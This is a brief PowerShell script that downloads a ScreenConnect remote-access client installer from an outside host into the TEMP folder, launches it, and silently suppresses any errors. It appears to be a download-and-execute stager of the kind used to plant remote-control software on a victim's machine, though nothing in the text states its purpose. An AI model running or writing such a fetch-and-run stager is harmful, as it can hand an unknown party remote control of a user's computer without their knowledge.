$someData = @(
    [PSCustomObject]@{a = "http://desktop-64educv:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"; b = "ScreenConnect.ClientSetup.msi"}
  );

  foreach ($i in $someData) {
    try {
      $filePath = "$env:TEMP\$($i.b)";
      $download = $true;
      if (Test-Path $filePath) {
        $download = $false;
      }
      if ($download) {
        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
      }
      Start-Process $filePath;
    }
    catch {
      # Error handling (optional)
    }
  }
